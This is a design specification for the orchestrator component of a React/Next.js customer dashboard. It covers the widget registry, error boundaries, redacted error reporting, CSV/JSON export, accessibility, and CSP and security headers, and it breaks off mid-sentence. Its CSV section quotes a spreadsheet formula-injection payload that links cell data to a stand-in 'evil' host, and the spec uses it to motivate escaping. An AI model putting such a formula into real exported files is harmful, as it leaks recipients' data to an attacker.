# Feature: DashboardOrchestrator

## Context
- The composition root of the Customer Intelligence Dashboard: the single component that assembles
  every widget, owns the state they share, and contains their failures
- Replaces the placeholder scaffolding in `src/app/page.tsx`, which currently fakes widget presence
  with `require()` in a `try/catch` and three dashed-border "Exercise N" boxes
- Turns a pile of independently-specified widgets into one production-ready application: consistent
  error handling, one export pipeline, one accessibility contract, one performance budget
- It is an **orchestrator, not a widget**. It renders no business data of its own. Every number on
  the screen comes from a child widget; the orchestrator supplies context, boundaries, layout, and
  cross-cutting services
- Derived from `requirements/production-ready-dashboard.md`, with `requirements/accessibility.md`
  and `requirements/code-quality.md` applied as cross-cutting constraints

### What this spec deliberately does not try to be

`requirements/production-ready-dashboard.md` is a whole-application production-readiness checklist,
not a component brief. Roughly a third of it describes infrastructure this repository does not have
and cannot acquire by writing a React component: authentication, sessions, CSRF, databases,
connection pooling, CDN configuration, backup and recovery, and an external error-tracking vendor.

Silently expanding a component spec to cover all of that would produce a document nobody can
implement or verify. Instead:

- Everything the orchestrator **owns** is specified in full below, to the same depth as
  `specs/customer-card-spec.md` and `specs/market-intelligence-spec.md`
- Everything that requires infrastructure the repo lacks is listed in
  [Deferred With Rationale](#deferred-with-rationale) with what would need to exist first
- Nothing from the requirements is dropped without appearing in one of those two places

## Prerequisites and Dependency Graph

**This spec forward-references components that do not exist yet.** At the time of writing, `src/`
contains exactly:

```
src/app/{favicon.ico,globals.css,layout.tsx,page.tsx}
src/data/{mock-customers.ts,mock-market-intelligence.ts}
```

There is no `src/components/`, no `src/services/`, no `src/lib/`, no API route of any kind, and no
test runner. `npm run lint` and `npm run type-check` are the only executable checks in
`package.json`.

The orchestrator is therefore the **last** component built, and it must degrade cleanly while its
children are still missing.

| Dependency | Spec status | Implementation status | Orchestrator behavior if absent |
|---|---|---|---|
| `CustomerCard` | `specs/customer-card-spec.md` — written | Not implemented | N/A — consumed via `CustomerSelector`, not directly |
| `CustomerSelector` | `requirements/customer-selector.md` only | Not implemented | Renders the "widget not yet built" placeholder tile; selection context stays `null` |
| `MarketIntelligenceWidget` | `specs/market-intelligence-spec.md` — written | Not implemented | Placeholder tile |
| Health score / alerts widgets | `requirements/health-score-calculator.md`, `requirements/predictive-alerts.md` | Not implemented | Placeholder tile |
| `ErrorBoundary` | Introduced by `specs/market-intelligence-spec.md` | Not implemented | See [Reconciling the error boundary](#reconciling-the-error-boundary-with-the-market-intelligence-spec) |

**Registry-driven, not import-driven.** Because most children do not exist, the orchestrator must
not hard-code imports of them. It reads a widget registry (below) whose entries carry a lazy
loader; a loader that fails to resolve renders a placeholder tile rather than crashing the
dashboard. This is what makes the orchestrator implementable *today* and complete *later*, and it
is the only mechanism in this spec that is load-bearing for the whole design.

Do not claim conformance to a sibling pattern you did not actually open and read.

### Two conflicts with existing specs that must be resolved, not ignored

#### `page.tsx` expects a default export; `CustomerCard` forbids one

`src/app/page.tsx:9` does `require('../components/CustomerCard')?.default`, while
`specs/customer-card-spec.md` mandates "Named export for the component — no default export". Those
cannot both hold. **Resolution:** the orchestrator deletes that `require()` scaffolding entirely.
`page.tsx` becomes a thin Server Component that renders `<DashboardOrchestrator />`, and all widget
loading goes through the registry using named exports. The named-export rule wins; the placeholder
is what disappears.

#### Reconciling the error boundary with the Market Intelligence spec

`specs/market-intelligence-spec.md` specifies `src/components/ErrorBoundary.tsx` as "a reusable
class-based boundary … this widget introduces it for the Dashboard to reuse", and requires the
widget be "Wrapped in `ErrorBoundary`". This spec introduces `WidgetErrorBoundary` with a richer
contract (retry limits, categorized reporting, reset keys).

**Resolution:** `WidgetErrorBoundary` is the real implementation. `src/components/ErrorBoundary.tsx`
becomes a thin deprecated re-export — `export { WidgetErrorBoundary as ErrorBoundary }` — carrying
a JSDoc `@deprecated` pointing at the replacement, so the Market Intelligence acceptance criterion
still passes unmodified and no widget ends up double-wrapped. If `ErrorBoundary.tsx` already exists
with its own logic when you implement this, port that logic into `WidgetErrorBoundary` and reduce
the file to the re-export; do not leave two boundaries with diverging retry semantics.

Widgets do **not** wrap themselves. The orchestrator wraps every registry entry exactly once, so a
widget author cannot forget and cannot double-wrap.

## Integration Architecture

### Component interaction diagram

```
src/app/layout.tsx  (Server Component — <html lang="en">, fonts, metadata)
  └─ src/app/page.tsx  (Server Component — thin; renders the orchestrator)
       └─ <DashboardOrchestrator>            'use client'
            ├─ <DashboardErrorBoundary>      catches anything the widget boundaries missed
            │    └─ <DashboardProvider>      selection + announce + reportError, one context
            │         ├─ <a href="#main-content">  skip link, first tabbable node
            │         ├─ <header>            <h1>, keyboard-shortcut help trigger, export trigger
            │         ├─ <Announcer>         THE single aria-live region for the whole dashboard
            │         ├─ <main id="main-content">
            │         │    └─ <DashboardGrid>            reads widgetRegistry, sorts by `order`
            │         │         └─ for each descriptor:
            │         │              <section aria-labelledby={id}>       landmark + <h2>
            │         │                └─ <WidgetErrorBoundary key={resetKey}>
            │         │                     └─ <Suspense fallback={<WidgetSkeleton/>}>
            │         │                          └─ lazy(descriptor.load)   ← widget renders here
            │         └─ <ExportDialog>      native <dialog>, focus trap for free, mounted last
            │
            └─ services reached from anywhere via context or direct import:
                 src/lib/errors/reportError.ts  ──POST──▶ /api/errors   (rate limited, redacted)
                 src/lib/export/exportRegistry.ts ◀── widgets self-register export providers
                 middleware.ts                   ──▶ CSP nonce + security headers on every response
                 /api/health                     ◀── load balancer / uptime monitor
```

### Data flow

1. **Selection flows down, never sideways.** `DashboardOrchestrator` holds
   `selectedCustomerId: string | null`. `CustomerSelector` calls `selectCustomer(id)` from context;
   the orchestrator resolves the id against `mockCustomers` and exposes the resolved
   `selectedCustomer: Customer | null`. Widgets read it from context. No widget passes data to
   another widget, and no widget fetches on another's behalf.
2. **Widget data stays inside the widget.** Consistent with `specs/market-intelligence-spec.md`
   ("no new global state and no fetching in the parent"), the orchestrator never fetches business
   data. It fetches nothing at all.
3. **Errors flow up through two channels, and the distinction matters.** Render-phase throws are
   caught by `WidgetErrorBoundary`. Async failures — `fetch` rejections, event-handler throws,
   promise rejections — are **not** caught by any React error boundary and must be handled by the
   widget's own `error` state, exactly as the Market Intelligence widget already specifies. Both
   channels converge on `reportError`. A spec that relies on boundaries to catch fetch failures is
   simply wrong about React, and this is the single most common way "comprehensive error handling"
   is implemented incorrectly.
4. **Announcements flow up, then out once.** Widgets call `announce(message, politeness)` from
   context. The orchestrator owns the only live region. See
   [The single live region](#the-single-live-region-a11y-1).
5. **Export pulls, it does not push.** Widgets register an `ExportProvider` describing what they can
   emit. `ExportDialog` asks the selected providers for rows at export time. Nothing is buffered
   into orchestrator state ahead of a user actually exporting.

### Key integration points

| Contract | Direction | Consumer |
|---|---|---|
| `useDashboard(): DashboardContextValue` | orchestrator → widget | every widget |
| `WidgetDescriptor` | widget → registry | `DashboardGrid` |
| `ExportProvider` | widget → export registry | `ExportDialog` |
| `reportError(error, context)` | anywhere → `/api/errors` | boundaries, widget catch blocks |
| `headingLevel` | orchestrator → `CustomerCard` | satisfies the card spec's `headingLevel` prop |

That last row is a concrete win from having written the card spec first: `CustomerCardProps` already
exposes `headingLevel` because "the card cannot know its surrounding document structure". The
orchestrator establishes that structure — `h1` page, `h2` widget — so `CustomerSelector` passes
`headingLevel={3}` and the hierarchy is correct by construction.

## Requirements

### Functional Requirements

#### F1 — Widget registry: `src/lib/dashboard/widgetRegistry.ts`

```ts
export type WidgetId =
  | 'customer-selector'
  | 'health-score'
  | 'market-intelligence'
  | 'predictive-alerts';

export interface WidgetDescriptor {
  id: WidgetId;
  /** Rendered as the <h2> and used as the aria-labelledby target. */
  title: string;
  /** Ascending. Ties broken by id for a stable order. */
  order: number;
  /** Tailwind column span classes per breakpoint. */
  gridSpan: string;
  /**
   * Lazy loader. Must resolve to `{ default: ComponentType<WidgetProps> }`.
   * Widgets use named exports, so the loader adapts:
   *   () => import('@/components/MarketIntelligenceWidget')
   *            .then(m => ({ default: m.MarketIntelligenceWidget }))
   */
  load: () => Promise<{ default: React.ComponentType<WidgetProps> }>;
  /**
   * Reserved skeleton height in px. Non-negotiable: an unreserved lazy widget
   * shifts everything below it on resolve and blows the CLS budget.
   */
  skeletonHeight: number;
  /** True when this widget is unusable without a selected customer. */
  requiresCustomer: boolean;
}

export interface WidgetProps {
  /** Stable id, useful for scoping DOM ids inside the widget. */
  widgetId: WidgetId;
}
```

- The registry is a plain exported array — data, not a class, and not a React component
- `order`, `gridSpan`, and `skeletonHeight` are the only layout knobs; widgets do not set their own
  outer margins, borders, or card chrome. The orchestrator owns the card shell so the grid stays
  visually uniform, which is precisely what `specs/market-intelligence-spec.md` anticipated with its
  "fallback card shell"
- **A registry entry whose `load` rejects is expected, not exceptional.** Most widgets do not exist
  yet. `DashboardGrid` catches the rejection and renders `WidgetUnavailableTile` — a bordered tile
  reading e.g. "Market Intelligence — not yet implemented" — and does **not** call `reportError` for
  a module-not-found rejection. Reporting those would flood `/api/errors` with expected noise
  during the workshop. Any other rejection reason is reported normally
- Adding a widget must require touching exactly one file: this registry. If implementing a new
  widget requires editing `DashboardOrchestrator.tsx`, the abstraction has failed

#### F2 — Dashboard context: `src/lib/dashboard/DashboardContext.tsx`

```ts
export interface DashboardContextValue {
  selectedCustomer: Customer | null;
  selectCustomer: (customerId: string | null) => void;
  /** Politeness defaults to 'polite'. */
  announce: (message: string, politeness?: 'polite' | 'assertive') => void;
  reportError: (error: unknown, context: ErrorContext) => void;
  /** Registers an export provider for the lifetime of the calling component. */
  registerExportProvider: (provider: ExportProvider) => () => void;
}

export function useDashboard(): DashboardContextValue;
```

- `useDashboard` throws a developer-facing error when called outside the provider. A silent `null`
  return here produces a confusing downstream crash instead of a clear one
- `selectCustomer` resolves the id against `mockCustomers`; an unknown id sets `null` and reports a
  `ValidationError`. It must not throw — a stale id from a restored URL or a future persistence
  layer is a data condition, not a bug
- Every function on the context is referentially stable across renders (`useCallback` with no
  changing dependencies, or a `useRef` holding a mutable box). If `announce` changes identity every
  render, every `React.memo` widget receiving it de-optimizes and every `useEffect` depending on it
  re-fires — which would quietly cancel the performance requirements in P1
- The value object is memoized with `useMemo` keyed on `selectedCustomer` alone

**Deviation noted:** the Market Intelligence spec says "no new global state". That constraint was
about not lifting *widget data* into the parent, and this context holds no widget data — only
selection and three stable service functions. The orchestrator does not fetch, cache, or transform
business data. Prop-drilling selection through lazily-loaded registry entries is not possible
without threading props through a generic renderer, which would be strictly worse. If a reviewer
disagrees, the fallback is to pass `selectedCustomer` as an explicit prop on `WidgetProps` and keep
context for `announce`/`reportError`/`registerExportProvider` only; both shapes satisfy every
acceptance criterion below.

#### F3 — Error classes: `src/lib/errors/AppError.ts`

```ts
export type ErrorCategory =
  | 'network'      // fetch failed, timed out, non-2xx
  | 'validation'   // bad user input or malformed data
  | 'render'       // a component threw during render
  | 'export'       // export generation or download failed
  | 'internal';    // anything unclassified

export type ErrorSeverity = 'warning' | 'error' | 'fatal';

export interface ErrorContext {
  widgetId?: WidgetId;
  category: ErrorCategory;
  severity: ErrorSeverity;
  /** Free-form, non-PII breadcrumbs. Values are redacted before transmission. */
  detail?: Record<string, string | number | boolean>;
}

export class AppError extends Error {
  readonly category: ErrorCategory;
  readonly severity: ErrorSeverity;
  /** Safe to render to a user. Never contains internal detail. */
  readonly userMessage: string;
  readonly cause?: unknown;
}

export class NetworkError extends AppError {}
export class ValidationError extends AppError {}
export class ExportError extends AppError {}
```

- Subclasses set `name` explicitly in the constructor. Minification mangles class names, so relying
  on `constructor.name` for categorization breaks in a production build — categorize on the
  `category` field, never on the class name
- `Object.setPrototypeOf(this, new.target.prototype)` in the constructor, so `instanceof` checks
  survive transpilation of the `class` extending a built-in
- `userMessage` is mandatory. A user-facing surface must never fall back to `error.message`, which
  routinely contains URLs, file paths, and upstream vendor text
- Every `AppError` carries `cause` for server-side logging, and `cause` is **never** serialized to
  the client-visible fallback UI in production

#### F4 — `DashboardErrorBoundary`: `src/components/DashboardErrorBoundary.tsx`

- Class component. React 19 still offers no hook equivalent; `useErrorBoundary` does not exist, and
  React 19's `onCaughtError` root option is unavailable because Next owns the root
- Implements both `getDerivedStateFromError` (to swap in the fallback) and `componentDidCatch` (to
  report, with the React `componentStack`)
- Wraps the entire dashboard, including the provider. It is the last line of defence: if it renders
  its fallback, the dashboard is gone, so the fallback must be **self-contained** — no context, no
  registry, no lazy import, no `useDashboard`. A fallback that depends on the thing that just broke
  will throw inside the boundary and blank the page
- Fallback content: a heading, a plain-language apology, a "Reload dashboard" button
  (`window.location.reload()`), and the error's `userMessage` when it is an `AppError`
- The fallback container receives `role="alert"` and takes focus on mount, so a keyboard or screen
  reader user is not left with focus on a node that no longer exists
- Reports with `severity: 'fatal'`, `category: 'render'`

#### F5 — `WidgetErrorBoundary`: `src/components/WidgetErrorBoundary.tsx`

```ts
export interface WidgetErrorBoundaryProps {
  widgetId: WidgetId;
  widgetTitle: string;
  /** Max in-place retries before the fallback becomes permanent. Default 2. */
  maxRetries?: number;
  children: React.ReactNode;
}
```

- Isolates one widget. A throw inside it must leave every sibling widget mounted, interactive, and
  with its state intact — this is the whole point of "graceful degradation when individual widgets
  or services fail"
- Fallback: the standard card shell, the widget's title as its `h2` (so the page heading structure
  does not develop a hole), a short message, and a "Try again" button
- **Retry is bounded and the bound is the interesting part.** "Try again" increments an internal
  attempt counter and clears the error state. A component that throws deterministically — a bad
  `mockCustomers` field, say — will throw again immediately; without a cap, an auto-retry becomes an
  infinite render loop that also generates unbounded error reports. After `maxRetries`, the fallback
  drops its retry button and reads "This widget is unavailable. Reload the dashboard to try again."
- Retrying must actually remount the subtree. Clearing `hasError` alone re-renders the *same*
  element tree and can preserve the broken state that caused the throw. Increment an internal
  `attempt` counter and apply it as `key` to the children wrapper so React discards the old
  instance
- The attempt counter resets to zero when `selectedCustomerId` changes: a widget that crashed on one
  customer's data deserves a clean slate on the next. `DashboardGrid` supplies a `key` composed of
  the descriptor id and the selected customer id (or `'none'`) for exactly this reason
- Focus moves to the fallback's heading on first error, and back to the retried widget's container
  after a successful retry. Silently dropping focus to `<body>` is a WCAG 2.4.3 failure and is the
  most common accessibility defect in error-boundary implementations
- The boundary cannot use `useDashboard` (it is a class), so it does not announce through context
  and instead relies on its `role="alert"` fallback container, which screen readers announce without
  a live region
- Reports with `severity: 'error'`, `category: 'render'`, and `detail.widgetId`

#### F6 — Development vs production error display

- Read `process.env.NODE_ENV` once, in one module, exported as `const isDevelopment`. Scattering
  `NODE_ENV` checks through components makes the production path impossible to reason about
- **Development:** fallbacks additionally render `error.message`, `error.stack`, and the React
  `componentStack` inside a collapsed `<details>` element. Do not rethrow in `componentDidCatch` —
  Next's dev overlay already surfaces errors in development, and rethrowing would escalate a
  contained widget failure into a page-level crash
- **Production:** only `userMessage`, or a generic "Something went wrong in this widget." No
  message, no stack, no component stack, no cause, no URL. This is the same discipline the Market
  Intelligence spec applies to its API error bodies

#### F7 — Error reporting: `src/lib/errors/reportError.ts` and `POST /api/errors`

Client module:

```ts
export function reportError(error: unknown, context: ErrorContext): void;
```

- Fire-and-forget. It returns `void`, never throws, and never rejects. An error reporter that can
  itself throw will take down the boundary that called it
- Transport: `navigator.sendBeacon` when available (survives page unload), else `fetch` with
  `keepalive: true`. Both are wrapped in `try/catch` that does nothing on failure
- **Redaction is mandatory and happens client-side, before transmission.** `mockCustomers` contains
  names, companies, and email addresses; an error payload that interpolates a customer object ships
  PII to a log. Allowed: `customerId`, `widgetId`, `category`, `severity`, error `name`, `message`,
  `stack`, `componentStack`, `pathname`, a `sessionId`, and `detail` values. Forbidden, and stripped
  by an explicit allowlist rather than a denylist: `name`, `company`, `email`, `domains`, and any
  string matching an email-shaped pattern anywhere in the payload
- **Bounded, or a render loop becomes a denial of service against your own logs.** Client-side:
  at most 10 reports per session, at most 1 identical report (same `name` + first stack frame +
  `widgetId`) per 60 seconds, payload truncated to 8 KB with `stack` trimmed first
- `sessionId` is a `crypto.randomUUID()` generated per page load, held in memory only — not in
  `localStorage`, not a cookie, so it needs no consent banner and cannot correlate across sessions
- In development, additionally `console.error` the full error so the browser console remains useful

Route: `src/app/api/errors/route.ts`

- `POST` only. Any other method returns `405`
- Validates the body against an explicit schema and rejects unknown top-level keys. `Content-Length`
  over 16 KB returns `413` without reading the body
- Rate limited per client — see S3
- Always responds `204 No Content` on acceptance, with an empty body. There is nothing useful to
  return, and a response body here is an information-disclosure surface for no benefit
- Server-side, writes one structured single-line JSON log entry via `console.error` (Next's
  production output is captured by the host's log collector). Log fields: timestamp, severity,
  category, widgetId, error name, truncated message, truncated stack, pathname, sessionId
- A malformed body returns `400` with `{ error: 'Invalid error report' }` — user-safe text only,
  matching the `{ error: string }` body shape established by `specs/market-intelligence-spec.md`
- `Cache-Control: no-store`

#### F8 — Export system: `src/lib/export/`

**Provider contract** (`exportRegistry.ts`) — widgets describe what they can emit; the orchestrator
knows nothing about market sentiment, health scores, or alerts:

```ts
export interface ExportProvider {
  id: string;                    // 'customers' | 'health-scores' | 'alerts' | 'market-intelligence'
  label: string;                 // shown in the export dialog
  /** Column order for tabular formats. Also the payload allowlist. */
  columns: readonly string[];
  /**
   * Async iterable so a large dataset never has to exist in memory at once,
   * and so cancellation can be honored between chunks.
   */
  getRows: (options: ExportOptions, signal: AbortSignal) =>
    AsyncIterable<Record<string, unknown>>;
  /** Row count when cheaply knowable, for a determinate progress bar. */
  estimateCount?: (options: ExportOptions) => number | undefined;
}

export interface ExportOptions {
  format: 'csv' | 'json';
  /** ISO dates, inclusive. Omitted means unbounded. */
  dateFrom?: string;
  dateTo?: string;
  /** Empty means all tiers. */
  subscriptionTiers: ReadonlyArray<'basic' | 'premium' | 'enterprise'>;
  /** Empty means all customers. */
  customerIds: readonly string[];
  /** Health score window, 0–100 inclusive. */
  healthScoreMin?: number;
  healthScoreMax?: number;
}
```

- `registerExportProvider` returns an unregister function; widgets call it from a `useEffect`
  cleanup. A provider left registered after its widget unmounts will be asked for rows it can no
  longer produce
- Registration is keyed by `provider.id`; a duplicate id replaces the previous entry and logs a
  development warning

**CSV writer** (`csv.ts`) — the requirements say "input validation and sanitization"; for CSV the
non-obvious threat is on the *output* side:

- **Formula injection.** A cell whose value begins with `=`, `+`, `-`, `@`, `\t`, or `\r` is
  interpreted as a formula by Excel, Google Sheets, and LibreOffice. A customer named
  `=HYPERLINK("http://evil/"&A1,"Click")` becomes a live exfiltration link in the recipient's
  spreadsheet. Every such cell is prefixed with a single apostrophe (`'`) before quoting. React's
  JSX escaping — the entire basis of the card spec's security section — provides **no** protection
  here, because this text never passes through JSX
- **Quoting.** A field containing `"`, `,`, `\n`, or `\r` is wrapped in double quotes with internal
  quotes doubled, per RFC 4180. Line terminator is `\r\n`
- **Encoding.** A UTF-8 byte-order mark is prepended, or Excel on Windows mojibakes non-ASCII
  company names
- `null` and `undefined` serialize to an empty field, never the strings `"null"` or `"undefined"`
- Column order comes from `provider.columns`, and **only** those columns are emitted. A provider
  that yields extra keys does not accidentally leak them into the file

**JSON writer** (`json.ts`):

- Emits `{ metadata: {...}, rows: [...] }`. `metadata` carries `exportedAt`, `providerId`, the
  applied `ExportOptions`, `rowCount`, and `"dataSource": "mock"` — the same anti-deception rule the
  Market Intelligence spec enforces with its "Sample data" badge. An exported file outlives the UI
  that produced it, so the file itself must say the data is not real
- Rows are streamed into the output incrementally with manual comma separation, not accumulated and
  `JSON.stringify`-ed once, so memory stays flat and cancellation stays responsive

**Chunking, progress, and cancellation** (`ExportUtils.ts`):

- Rows are consumed in batches of 500. Between batches: check `signal.aborted` and bail; then yield
  to the event loop (`scheduler.yield()` where available, else a `setTimeout(resolve, 0)` promise)
  so the main thread stays responsive and the progress bar actually paints. Without a yield, a
  synchronous loop over 10,000 rows freezes the tab and violates the 60fps requirement outright
- Progress is **determinate** only when `estimateCount` returns a number; otherwise the UI shows an
  indeterminate indicator and a running row count. A progress bar that fabricates a percentage from
  an unknown total is worse than none
- On abort: no file is written, no partial download appears, and the dialog returns to its idle
  state with "Export cancelled" announced politely
- Delivery is a client-side `Blob` + `URL.createObjectURL` + a synthetic anchor click, and
  `URL.revokeObjectURL` in a `finally`. A leaked object URL pins the entire generated file in memory
  for the life of the document — the exact "memory leak prevention" the requirements ask for

**Filenames** (`filename.ts`):

- Pattern: `{providerId}_{YYYY-MM-DDTHH-mm-ssZ}[_filtered].{csv|json}`
- Colons are stripped from the ISO timestamp. A filename containing `:` is **illegal on Windows**
  and the download will be silently renamed or fail
- `_filtered` is appended when any `ExportOptions` field narrows the set, so an incomplete export is
  never mistaken for a full one
- The provider id is validated against `/^[a-z0-9-]+$/`; anything else is rejected. This closes
  path traversal and header injection if a filename is ever used server-side in
  `Content-Disposition`

#### F9 — `ExportDialog`: `src/components/ExportDialog.tsx`

- Uses the **native `<dialog>`** element with `showModal()`. This provides a focus trap, `Esc` to
  close, focus restoration to the trigger, and `aria-modal` semantics from the platform. Every one
  of those is a WCAG requirement in `requirements/production-ready-dashboard.md` ("Modal and popup
  focus trap implementation"), and every one is a well-known source of bugs when hand-rolled with
  `div` + keydown listeners
- Contents: a provider checklist (from the export registry), a format radio group, date range
  inputs, a subscription-tier multi-select, a health-score range, a live "N rows will be exported"
  estimate when available, an Export button, and a Cancel button
- While an export runs: the Export button becomes a Cancel button, filter inputs are disabled, and
  the dialog cannot be dismissed by `Esc` without aborting the run — a dismissed dialog with a live
  generator behind it leaks both the generator and the abort controller
- Errors render inline as `ExportError.userMessage` with a retry control; the dialog stays open so
  the user does not lose their filter selections
- Every control has an associated `<label>`; the date range validates `dateFrom <= dateTo` inline
  before the Export button enables

#### A11Y — Accessibility

##### The single live region (A11Y-1)

`requirements/production-ready-dashboard.md` asks for "Live regions for dynamic content updates and
alerts", and `specs/market-intelligence-spec.md` already gives its results region
`aria-live="polite"`. With four widgets following that pattern independently, a customer selection
triggers four simultaneous announcements; screen readers queue and interleave them, and the user
hears an unintelligible run-on. Per-widget live regions do not compose.

- The orchestrator renders exactly **one** `aria-live="polite"` region and one
  `aria-live="assertive"` region, both visually hidden, both present in the DOM from first paint —
  a live region inserted at the same time as its content is frequently not announced at all
- Widgets announce through `announce()` from context rather than owning a region. When a widget's
  own spec calls for `aria-live` on a results container (as Market Intelligence does), that
  container keeps `aria-busy` and `role="status"` for state, and routes textual announcements
  through `announce()`
- `announce` **serializes**: messages queue and are written to the region one at a time with a
  ~150ms gap, and an identical consecutive message is dropped. Writing a second message into a live
  region before the first is spoken cancels the first in several screen readers
- `assertive` is reserved for errors and completed/failed exports. Everything else is `polite`
- Required announcements: customer selected ("Selected {name}, {company}"), widget load failure,
  export started, export progress at 25/50/75%, export complete with row count, export cancelled,
  export failed

##### Structure and navigation (A11Y-2)

- Landmarks: one `<header>`, one `<main id="main-content">`, one `<footer>` if present. Each widget
  is a `<section aria-labelledby="widget-{id}-heading">` — a `<section>` is only a landmark when it
  has an accessible name, so an unnamed `<section>` buys nothing
- Heading hierarchy: `h1` page title (exactly one), `h2` per widget title, `h3` inside widgets. This
  is why `CustomerCard` renders `h3` by default and why `CustomerSelector` must pass
  `headingLevel={3}` rather than accepting the default by luck
- Skip link is the **first tabbable element** in the DOM, visually hidden until focused, targeting
  `#main-content`. `<main>` needs `tabIndex={-1}` for the target to reliably receive focus
- Tab order follows DOM order. No positive `tabIndex` anywhere in the dashboard
- Focus indicators: a visible ring on every interactive element meeting 3:1 contrast against both
  adjacent colors. Never `outline: none` without an equivalent replacement, and the ring must be
  visible in dark mode, which `globals.css` already switches on via `prefers-color-scheme`

##### Keyboard shortcuts (A11Y-3)

- Provided: `/` focus customer search, `e` open export dialog, `?` open shortcut help, `Esc` close
  the topmost overlay
- **Guarded.** A handler must return immediately when the event target is an `input`, `textarea`,
  `select`, or `[contenteditable]`, or when any of `ctrl`/`meta`/`alt` is held. Unguarded single-key
  shortcuts make text fields unusable and collide with screen reader browse-mode single-letter
  navigation — this is WCAG 2.1.4 (Character Key Shortcuts), and it is the reason the requirement
  "keyboard shortcuts for common dashboard actions" cannot be implemented naively
- Shortcuts are discoverable: a visible "Keyboard shortcuts" trigger in the header opens the same
  help dialog `?` does. An undiscoverable shortcut is not an accessibility feature
- Listener attaches to `document` in a `useEffect` and is removed in cleanup. A listener leaked
  across Fast Refresh cycles produces duplicate handling and is a genuine memory leak

##### Contrast, forced colors, and motion (A11Y-4)

- WCAG 2.1 AA: 4.5:1 for normal text, 3:1 for large text and meaningful non-text elements —
  including the skeleton placeholders, which must remain perceivable
- **Forced-colors mode flattens `background-color`.** Both `CustomerCard`'s health dot and the
  Market Intelligence sentiment dot are colored indicators, and in Windows High Contrast they all
  collapse to the same system color, destroying the only distinction. Under
  `@media (forced-colors: active)`, status indicators must additionally carry a shape or border
  difference and must keep their required visible text label. Both sibling specs already mandate a
  text label alongside color, so the text channel is intact; the orchestrator's job is to verify it
  and to add `forced-color-adjust` handling to the shared card shell
- `@media (prefers-reduced-motion: reduce)` disables skeleton shimmer, dialog transitions, and any
  progress-bar animation, leaving instant state changes
- Dark mode is already active in `src/app/globals.css` via `prefers-color-scheme`. Contrast must be
  verified in **both** schemes; a palette that passes on white commonly fails on `#0a0a0a`

#### P1 — Performance

- **Code splitting.** Every registry widget loads through `React.lazy` + `Suspense`. The
  orchestrator, provider, boundaries, and shell are in the initial bundle; widget code is not
- `ExportDialog` and the export writers load **only** on first open. CSV/JSON generation code has no
  business in the initial payload
- **Skeletons reserve height.** `WidgetSkeleton` renders at the descriptor's `skeletonHeight`. This
  is the single highest-leverage thing in this section: lazily-loaded widgets with zero-height
  fallbacks are the classic cause of a failing CLS score, and the requirement is CLS < 0.1
- **Memoization that actually works.** `React.memo` on widget wrappers is defeated by an inline
  object or arrow prop, which is a fresh reference every render — so `WidgetProps` is deliberately
  narrow (one string), context functions are referentially stable per F2, and the context value is
  memoized. A `React.memo` wrapper added without those three properties measurably slows the app by
  adding a comparison that never succeeds. React 19's compiler is not enabled in this repo, so none
  of this is automatic
- **Virtual scrolling is required but currently unreachable.** `requirements/customer-selector.md`
  says "must handle 100+ customers efficiently" and the production requirements ask for virtual
  scrolling; `mockCustomers` has 8 entries, so no implementation of it can be exercised or reviewed.
  Following the precedent set by `specs/customer-card-spec.md` (where fixtures are a deliverable),
  **`src/data/customer-fixtures.ts` exporting `generateCustomers(count: number): Customer[]` is a
  deliverable of this spec.** It is deterministic (seeded, no `Math.random()`, mirroring M2 of the
  Market Intelligence spec) so results are reproducible, and it reuses the exported `Customer` type.
  Virtualization activates above a 100-row threshold; below it the list renders normally, because
  virtualizing 8 rows adds complexity and scroll-anchoring bugs for no gain
- **Leak prevention, concretely.** Every `addEventListener`, `setTimeout`, `setInterval`,
  `AbortController`, `MutationObserver`, and `createObjectURL` created by orchestrator-owned code
  has a matching teardown in the same `useEffect` cleanup. `StrictMode` double-invocation in
  development is the cheapest way to catch a missing one
- Budgets from the requirements — FCP < 1.5s, LCP < 2.5s, CLS < 0.1, TTI < 3.5s, load < 3s — are
  carried forward as targets. See [Deferred With Rationale](#deferred-with-rationale) for why they
  cannot be *enforced* in this repository, and the Manual acceptance criteria for what is measured

#### S1–S5 — Security

##### S1 — Security headers: `next.config.ts`

`next.config.ts` is currently empty except for a comment placeholder. Add an `async headers()`
returning, for all routes:

| Header | Value | Why |
|---|---|---|
| `X-Frame-Options` | `DENY` | clickjacking; belt-and-braces with `frame-ancestors` |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing, relevant to export downloads |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | no path leakage |
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains` | HTTPS enforcement |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | unused capabilities off |
| `X-DNS-Prefetch-Control` | `off` | no speculative lookups |

HSTS is only meaningful when the deployment terminates TLS; on plain-HTTP local development it is
inert, not harmful.

##### S2 — Content Security Policy: `middleware.ts`

- **CSP for a Next App Router app requires a nonce, and this is the part that is easy to get wrong.**
  Next injects inline bootstrap scripts for hydration, so a policy without `'unsafe-inline'` and
  without a nonce breaks the app completely. A static `Content-Security-Policy` in `next.config.ts`
  **cannot** carry a nonce, because nonces must be unique per response. So CSP is set in
  `middleware.ts`, which generates `crypto.randomUUID()` per request, forwards it on an `x-nonce`
  request header for the app to read, and sets the response header
- Policy: `default-src 'self'`; `script-src 'self' 'nonce-{nonce}' 'strict-dynamic'`;
  `style-src 'self' 'unsafe-inline'`; `img-src 'self' data: blob:`; `font-src 'self'`;
  `connect-src 'self'`; `object-src 'none'`; `base-uri 'self'`; `form-action 'self'`;
  `frame-ancestors 'none'`
- `'unsafe-inline'` on `style-src` is **required, not sloppiness**: `next/font` (already used in
  `src/app/layout.tsx` for Geist) injects inline `<style>`, which is not nonceable the way scripts
  are. Say so in a comment rather than leaving a future reviewer to assume it was an oversight
- `next/font` self-hosts the font files at build time, so no `fonts.gstatic.com` origin is needed —
  `font-src 'self'` is sufficient and must not be widened out of habit
- Development additionally needs `'unsafe-eval'` on `script-src` for React Refresh. Gate it on
  `NODE_ENV` so it can never reach production
- `blob:` on `img-src` is present for object-URL previews; it is **not** needed for downloads and
  must not be added to `script-src`, where `blob:` would reopen script injection
- Ship a `Content-Security-Policy-Report-Only` variant first if you are unsure; a wrong CSP is a
  white screen, and the failure mode is total

##### S3 — Rate limiting: `src/lib/rateLimit.ts`

- Fixed-window counter in a module-level `Map`, applied to `POST /api/errors` and any server-side
  export route. Default 20 requests per minute per key
- Key derivation: first hop of `x-forwarded-for`, falling back to a constant. **This header is
  client-spoofable unless a trusted proxy overwrites it**, so the limiter is honest abuse dampening,
  not a security control. Write that in a comment
- **In-memory means per-instance.** On any serverless or multi-replica host, N instances means N×
  the intended limit, and a cold start resets the window. A real limit needs shared state (Redis,
